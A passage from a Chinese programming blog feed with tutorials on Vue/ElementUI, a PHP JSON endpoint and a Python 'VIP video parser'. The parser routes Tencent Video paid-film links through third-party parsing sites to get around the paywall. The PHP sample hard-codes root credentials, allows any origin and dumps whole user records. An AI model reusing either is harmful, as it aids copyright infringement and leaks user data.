120px;width: 100%;height: 500px&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>中设置变量和执行的改变变量值的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iframeSrc: &#x27;&#x27;,</span><br><span class="line"> methods: &#123;</span><br><span class="line">                    router() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin.php&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    router2() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin2.php&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>就可以实现点击不同的标签，会改变为不同引用页面的方法。</p><h4 id="3，axios进行数据通信"><a href="#3，axios进行数据通信" class="headerlink" title="3，axios进行数据通信"></a>3，axios进行数据通信</h4><p>先下载axios.min.js到本地并进行引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://unpkg.com/axios/dist/axios.min.js</span><br><span class="line">&lt;!-- 引入axios库 --&gt;</span><br><span class="line">  &lt;script src=&quot;./element/axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>写出执行的php页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);</span><br><span class="line">header(&#x27;content-type:text/html; charset= utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">$link = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;hysxm&quot;);</span><br><span class="line"></span><br><span class="line">$tableData = array();</span><br><span class="line">//从表中查询数据</span><br><span class="line">$select = &quot;SELECT * FROM users where isadm=0 &quot;;</span><br><span class="line">$result1 = $link-&gt;query($select);</span><br><span class="line">if ($result1-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">    // 输出数据</span><br><span class="line">    while ($row = $result1-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $tableData[] = $row;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$link-&gt;close();</span><br><span class="line"></span><br><span class="line">$requestPath = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: application/json&#x27;);</span><br><span class="line">echo json_encode($tableData); // 输出所有用户数据的JSON表示</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在table标签中引用tableData变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%; font-size:20px;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>设置变量并和页面刷新前执行的方法，用axios发送请求获取返回数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tableData: [],</span><br><span class="line">get_data: function () &#123;</span><br><span class="line">          this.menu_name = &quot;用户列表&quot;;</span><br><span class="line">          axios.get(&#x27;http://127.0.0.1/user/quer_user.php&#x27;) // 执行注销链接的请求</span><br><span class="line">            .then(response =&gt; &#123;</span><br><span class="line">              this.tableData = response.data; // 将响应数据存储在Vue实例的数据中</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(error =&gt; &#123;</span><br><span class="line">              alert(&quot;获取数据失败！&quot;); // 在请求失败时显示提示信息</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        mounted() &#123;</span><br><span class="line">        this.get_data();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>页面效果:</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171028821.png" alt="image-20231217102828547"></p><h4 id="4-vite设置局域网访问"><a href="#4-vite设置局域网访问" class="headerlink" title="4,vite设置局域网访问"></a>4,vite设置局域网访问</h4><p>cmd进入项目的文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx vite --host 0.0.0.0</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171031585.png" alt="image-20231217103124483"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171031098.png" alt="image-20231217103138604"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，html引用element2组件&quot;&gt;&lt;a href=&quot;#1，html引用element2组件&quot; class=&quot;headerlink&quot; title=&quot;1，html引用element2组件&quot;&gt;&lt;/a&gt;1，html引用element2组件&lt;/h4&gt;&lt;p&gt;elemen</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十七，python爬虫-VIP视频解析器</title>
    <link href="http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/"/>
    <id>http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/</id>
    <published>2023-12-11T13:48:34.000Z</published>
    <updated>2023-12-11T14:07:29.302Z</updated>
    
    <content type="html"><![CDATA[<p>​用python爬虫制作一个VIP视频解析器，通过拿到腾讯视频的VIP电影地址发送到解析网站，获取解析结果地址，自动打开浏览器访问，具体步骤如下：</p><h4 id="1，导入该程序所需要的python组件库"><a href="#1，导入该程序所需要的python组件库" class="headerlink" title="1，导入该程序所需要的python组件库"></a>1，导入该程序所需要的python组件库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image,ImageTk</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">import webbrowser</span><br></pre></td></tr></table></figure><h4 id="2，制作一个居中的窗口"><a href="#2，制作一个居中的窗口" class="headerlink" title="2，制作一个居中的窗口"></a>2，制作一个居中的窗口</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">root=Tk()</span><br><span class="line"><span class="comment"># 窗口加标题</span></span><br><span class="line">root.title(<span class="string">&#x27;VIP视频解析器&#x27;</span>)</span><br><span class="line"><span class="comment"># 设置窗口大小</span></span><br><span class="line">root.geometry(<span class="string">&quot;500x470&quot;</span>)</span><br><span class="line"><span class="comment"># 获取屏幕的宽度和高度</span></span><br><span class="line">screen_width = root.winfo_screenwidth()</span><br><span class="line">screen_height = root.winfo_screenheight()</span><br><span class="line"><span class="comment"># 计算窗口在屏幕上的位置（居中）</span></span><br><span class="line">x_pos = <span class="built_in">int</span>((screen_width / <span class="number">2</span>) - (<span class="number">500</span> / <span class="number">2</span>))</span><br><span class="line">y_pos = <span class="built_in">int</span>((screen_height / <span class="number">2</span>) - (<span class="number">470</span> / <span class="number">2</span>))</span><br><span class="line"><span class="comment"># 使用geometry()函数设置窗口的位置和大小</span></span><br><span class="line">root.geometry(<span class="string">&quot;+&#123;&#125;+&#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_pos, y_pos))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一直打开窗口</span></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><h4 id="3-在该代码文件的同一文件夹下有一张名为fengmian-png的图片，用相对路径引用并放到窗口上"><a href="#3-在该代码文件的同一文件夹下有一张名为fengmian-png的图片，用相对路径引用并放到窗口上" class="headerlink" title="3,在该代码文件的同一文件夹下有一张名为fengmian.png的图片，用相对路径引用并放到窗口上"></a>3,在该代码文件的同一文件夹下有一张名为fengmian.png的图片，用相对路径引用并放到窗口上</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 窗口中加上一个图片</span></span><br><span class="line">image=Image.<span class="built_in">open</span>(<span class="string">&#x27;./fengmian.png&#x27;</span>)</span><br><span class="line"><span class="comment"># 转换为PhotoImage对象，避免图像丢失问题  </span></span><br><span class="line">img = ImageTk.PhotoImage(image)  </span><br><span class="line"><span class="comment"># 创建一个Label，并设置图片  </span></span><br><span class="line">lab_img = Label(root, image=img)  </span><br><span class="line">lab_img.image = img  <span class="comment"># 避免图像丢失问题  </span></span><br><span class="line">lab_img.pack()</span><br></pre></td></tr></table></figure><h4 id="4-加上选择解析路径的标签"><a href="#4-加上选择解析路径的标签" class="headerlink" title="4,加上选择解析路径的标签"></a>4,加上选择解析路径的标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chooce_frm=LabelFrame(root)</span><br><span class="line">chooce_frm.pack(pady=10,fill=&#x27;both&#x27;)</span><br><span class="line">jiexi_lab=Label(chooce_frm, text=&#x27;选择路径：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)</span><br><span class="line"># 设置单选变量</span><br><span class="line">num_chooce=IntVar()</span><br><span class="line"># 设置默认选中路线1</span><br><span class="line">num_chooce.set(1)</span><br><span class="line"># 设置三个单选按钮</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;1号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=1).pack(side=&#x27;left&#x27;)</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;2号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=2).pack(side=&#x27;left&#x27;)</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;3号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=3).pack(side=&#x27;left&#x27;)</span><br></pre></td></tr></table></figure><h4 id="5，加上输入要解析的视频的地址的标签"><a href="#5，加上输入要解析的视频的地址的标签" class="headerlink" title="5，加上输入要解析的视频的地址的标签"></a>5，加上输入要解析的视频的地址的标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url_frm=LabelFrame(root)</span><br><span class="line">url_frm.pack(pady=10,fill=&#x27;both&#x27;)</span><br><span class="line">bofang_lab=Label(url_frm, text=&#x27;播放地址：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)</span><br><span class="line"># 设置输入变量</span><br><span class="line">input_var=StringVar()</span><br><span class="line">input_ent=Entry(url_frm,width=100,relief=&#x27;flat&#x27;,textvariable=input_var)</span><br><span class="line">input_ent.pack(side=&#x27;left&#x27;,fill=&#x27;both&#x27;)</span><br></pre></td></tr></table></figure><h4 id="6，设置解析按钮"><a href="#6，设置解析按钮" class="headerlink" title="6，设置解析按钮"></a>6，设置解析按钮</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">btn_jiexi=Button(root,command=parser,text=&#x27;解析视频&#x27;,bg=&#x27;#00BFFF&#x27;,fg=&#x27;#FFFFFF&#x27;,activebackground=&#x27;#00BFFF&#x27;,activeforeground=&#x27;#00BFFF&#x27;,font=(&#x27;微软雅黑&#x27;,15),relief=&#x27;flat&#x27;)</span><br><span class="line">btn_jiexi.pack(fill=&#x27;both&#x27;)</span><br></pre></td></tr></table></figure><h4 id="7，写出点击按钮所执行的方法"><a href="#7，写出点击按钮所执行的方法" class="headerlink" title="7，写出点击按钮所执行的方法"></a>7，写出点击按钮所执行的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 点击解析按钮，进行解析</span><br><span class="line">def parser():</span><br><span class="line">    num=num_chooce.get()</span><br><span class="line">    base_url=input_var.get()</span><br><span class="line">    if not base_url:</span><br><span class="line">        message=&#x27;视频播放地址不能为空，请重新输入！&#x27;</span><br><span class="line">        open_new_window(message)</span><br><span class="line">    else:</span><br><span class="line">        if num==1:</span><br><span class="line">            link=&#x27;https://www.8090g.cn/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        elif num==2:</span><br><span class="line">            link=&#x27;https://www.8090.la/8090/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        elif num==3:</span><br><span class="line">            link=&#x27;https://jx.xmflv.com/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        else:</span><br><span class="line">            message=&#x27;路线选择错误，请重新选择路线！&#x27;</span><br><span class="line">            open_new_window(message)</span><br></pre></td></tr></table></figure><p>其中<a href="https://www.8090g.cn/?url=%E6%98%AF%E8%A7%A3%E6%9E%90%E5%9C%B0%E5%9D%80">https://www.8090g.cn/?url=是解析地址</a><br><a href="https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html%E6%98%AF%E8%A7%A3%E6%9E%90%E5%89%8D%E7%9A%84%E5%9C%B0%E5%9D%80">https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析前的地址</a><br><a href="https://www.8090g.cn/?url=https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html%E6%98%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E7%9A%84%E5%9C%B0%E5%9D%80">https://www.8090g.cn/?url=https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析后的地址</a></p><h4 id="8，写出在主窗口上弹出新窗口的方法"><a href="#8，写出在主窗口上弹出新窗口的方法" class="headerlink" title="8，写出在主窗口上弹出新窗口的方法"></a>8，写出在主窗口上弹出新窗口的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在主窗口上弹出新窗口</span><br><span class="line">def open_new_window(message):</span><br><span class="line">    new_window = Toplevel(root)</span><br><span class="line">    new_window.title(&quot;vip视频解析器&quot;)</span><br><span class="line">    new_window.geometry(&quot;350x100+650+400&quot;)</span><br><span class="line">    label = Label(new_window, text=message)</span><br><span class="line">    label.pack()</span><br></pre></td></tr></table></figure><h4 id="9，写出获取解析后的视频地址并打开的方法"><a href="#9，写出获取解析后的视频地址并打开的方法" class="headerlink" title="9，写出获取解析后的视频地址并打开的方法"></a>9，写出获取解析后的视频地址并打开的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 获取解析后的视频地址并打开</span><br><span class="line">def jieixi(link):</span><br><span class="line">    response=requests.get(link)</span><br><span class="line">    content=response.text</span><br><span class="line">    tree=etree.HTML(content)</span><br><span class="line">    url=tree.xpath(&#x27;//iframe[@id=&quot;WANG&quot;]/@src&#x27;)[0]</span><br><span class="line">    webbrowser.open(url)</span><br></pre></td></tr></table></figure><h4 id="10，运行效果："><a href="#10，运行效果：" class="headerlink" title="10，运行效果："></a>10，运行效果：</h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112159140.png" alt="image-20231211215957932"></p><p>VIP视频地址：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112200307.png" alt="image-20231211220053194"></p><p>复制地址栏中的地址，输入后点击解析视频</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112201923.png" alt="image-20231211220150649"></p><p>解析成功，自动打开浏览器观看</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112205198.png" alt="image-20231211220528128"></p><p>python爬虫-VIP视频解析器制作完成！</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		用python爬虫制作一个VIP视频解析器，通过拿到腾讯视频的VIP电影地址发送到解析网站，获取解析结果地址，自动打开浏览器访问，具体步骤如下：&lt;/p&gt;
&lt;h4 id=&quot;1，导入该程序所需要的python组件库&quot;&gt;&lt;a href=&quot;#1，导入该程序所需要的python</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十六，VUE的使用</title>
    <link href="http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-12-11T13:33:05.000Z</published>
    <updated>2023-12-11T13:43:23.768Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，要使用vue前先下载node-js"><a href="#1，要使用vue前先下载node-js" class="headerlink" title="1，要使用vue前先下载node.js"></a>1，要使用vue前先下载node.js</h4><p>下载地址为：<a href="https://nodejs.org/en">https://nodejs.org/en</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v  </span><br><span class="line">检查是否已安装node.js</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112141387.png" alt="image-20231211205438106"></p><h4 id="2，创建vue项目"><a href="#2，创建vue项目" class="headerlink" title="2，创建vue项目"></a>2，创建vue项目</h4><p>cmd命令窗口进入一个放置vue项目的文件夹，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm create vue@latest</span><br></pre></td></tr></table></figure><p>若没有vue环境则会自动安装，然后定义项目的名字。接下来的就都一直按回车键确定就好了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112134407.png" alt="img"></p><p>底部会出现3行提示，跟着它敲然后回车就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd you_project_name//进入项目</span><br><span class="line">npm install//初始化项目</span><br><span class="line">npm run dev//运行服务</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112135020.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112135122.png" alt="img"></p><p>复制地址：<a href="http://localhost:5173/">http://localhost:5173/</a> 去浏览器打开，就可以跳转到vue的界面了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112138536.png" alt="img"></p><p>表示项目创建成功！</p><h4 id="3-Vue3项目中引入ElementUI"><a href="#3-Vue3项目中引入ElementUI" class="headerlink" title="3.Vue3项目中引入ElementUI"></a>3.Vue3项目中引入ElementUI</h4><p>​ElementUI是一个强大的PC端UI组件框架，它不依赖于vue，但是却是当前和vue配合做项目开发的一个比较好的ui框架，其包含了布局（layout)，容器（container）等各类组件，基本上能满足日常网站的搭建开发。</p><p>​ElementUI组件地址：<a href="https://element-plus.org/zh-CN/component/button.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95">https://element-plus.org/zh-CN/component/button.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95</a></p><p>首先安装ElementUI的使用库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install element-plus --save</span><br></pre></td></tr></table></figure><p>​在vue3中按需引入ElementUI，需要使用其他的插件辅助，需要安装unplugin-vue-components 和 unplugin-auto-import这两款插件；安装方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D unplugin-vue-components unplugin-auto-import</span><br></pre></td></tr></table></figure><p>还需要在vite.config.js文件该为如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;</span><br><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">import AutoImport from &#x27;unplugin-auto-import/vite&#x27;</span><br><span class="line">import Components from &#x27;unplugin-vue-components/vite&#x27;</span><br><span class="line">import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;</span><br><span class="line"></span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">    // ...</span><br><span class="line">    AutoImport(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">    Components(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在main.js中修改为如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//import &#x27;./assets/main.css&#x27;</span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">import ElementPlus from &#x27;element-plus&#x27;;</span><br><span class="line">import &#x27;element-plus/dist/index.css&#x27;</span><br><span class="line">createApp(App).mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p>引入完毕之后，我们可进行按需引入需要使用的组件，使用方法如下，引入input组件和button组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;el-input class=&quot;input&quot; v-model=&quot;input&quot; type=&quot;file&quot; placeholder=&quot;Please input&quot; /&gt;</span><br><span class="line">    &lt;el-button class=&quot;button&quot; type=&quot;primary&quot;&gt;文件处理&lt;/el-button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import &#123; ElButton, ElInput &#125; from &#x27;element-plus&#x27;</span><br><span class="line">  import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line">  </span><br><span class="line">  export default &#123;</span><br><span class="line">    components: &#123; ElButton,ElInput &#125;,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.input &#123;</span><br><span class="line">  display: inline;</span><br><span class="line">  margin: 20px 30px;</span><br><span class="line">&#125;</span><br><span class="line">.button &#123;</span><br><span class="line">  width: 90px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112136801.png" alt="img"></p><h4 id="4，使用ElementUI组件搭建管理系统页面"><a href="#4，使用ElementUI组件搭建管理系统页面" class="headerlink" title="4，使用ElementUI组件搭建管理系统页面"></a>4，使用ElementUI组件搭建管理系统页面</h4><p>创建一个manger.vue，然后在App.vue中引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import manger from &#x27;./view/manger.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;manger&gt;&lt;/manger&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>在其中用了菜单，按钮，图标，表格，分页等组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">htm,组件代码在&lt;template&gt;中</span><br><span class="line">JavaScript代码在&lt;script&gt;中</span><br><span class="line">css代码在&lt;style&gt;中</span><br><span class="line">&lt;el-row&gt;表示行    span表示占比，一共为24</span><br><span class="line">&lt;el-col&gt;表示列</span><br></pre></td></tr></table></figure><p>成品代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 